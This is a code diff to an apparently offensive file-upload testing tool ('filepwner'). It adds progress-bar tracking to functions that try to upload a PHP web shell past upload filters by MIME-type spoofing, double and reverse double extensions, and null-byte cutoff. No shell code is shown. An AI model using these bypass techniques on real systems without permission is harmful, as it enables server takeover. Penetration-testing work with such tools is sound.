@@ -1,4 +1,4 @@
-from filepwner import parse_request_file, upload, info, debug, progress_bar, options, check_shell, check_success, success, error, exit_success, failure, upload_and_validate
+from filepwner import parse_request_file, upload, info, debug, options, check_shell, check_success, success, error, exit_success, failure, upload_and_validate, set_progress_bar
 import variations
 import time
 
@@ -9,10 +9,10 @@ def mimetype_spoofing(request_file, session, options, accepted_extensions):
     print()
 
     simple_shell_path = "assets/shells/simple.php"
+    set_progress_bar(len(accepted_extensions)*2)
     
     for extension in accepted_extensions:
         mimetype = variations.mimetypes[extension]
-        #if (options.global_verbosity < 2): progress_bar(accepted_extensions.index(extension)+1, len(accepted_extensions)*2)
         with open(simple_shell_path, 'rb') as file: file_data = file.read()
 
         file_extension = ".php"
@@ -32,11 +32,11 @@ def double_extension(request_file, session, options, accepted_extensions):
 
     content, headers, host, path = parse_request_file(request_file)
     simple_shell_path = "assets/shells/simple.php"
+    set_progress_bar(len(accepted_extensions)*3)
     
     for extension in accepted_extensions:
         mimetype_php = variations.mimetypes["php"]
         mimetype_original = variations.mimetypes[extension]
-        #if (options.global_verbosity < 2): progress_bar(accepted_extensions.index(extension)+1, len(accepted_extensions)*3)
         with open(simple_shell_path, 'rb') as file: file_data = file.read()
 
         #with php mimetype
@@ -61,11 +61,11 @@ def reverse_double_extension(request_file, session, options, accepted_extensions
 
     content, headers, host, path = parse_request_file(request_file)
     simple_shell_path = "assets/shells/simple.php"
+    set_progress_bar(len(accepted_extensions)*3)
     
     for extension in accepted_extensions:
         mimetype_php = variations.mimetypes["php"]
         mimetype_original = variations.mimetypes[extension]
-        #if (options.global_verbosity < 2): progress_bar(accepted_extensions.index(extension)+1, len(accepted_extensions)*3)
         with open(simple_shell_path, 'rb') as file: file_data = file.read()
 
         #with php mimetype
@@ -89,12 +89,12 @@ def null_byte_cutoff(request_file, session, options, accepted_extensions):
 
     content, headers, host, path = parse_request_file(request_file)
     simple_shell_path = "assets/shells/simple.php"
+    set_progress_bar(len(accepted_extensions)*len(variations.null_bytes)*3)
     
     for extension in accepted_extensions:
         for null_byte in variations.null_bytes:
             mimetype_php = variations.mimetypes["php"]
             mimetype_original = variations.mimetypes[extension]
-            #if (options.global_verbosity < 2): progress_bar(accepted_extensions.index(extension)+1, len(accepted_extensions)*3)
             with open(simple_shell_path, 'rb') as file: file_data = file.read()
 
             #with php mimetype
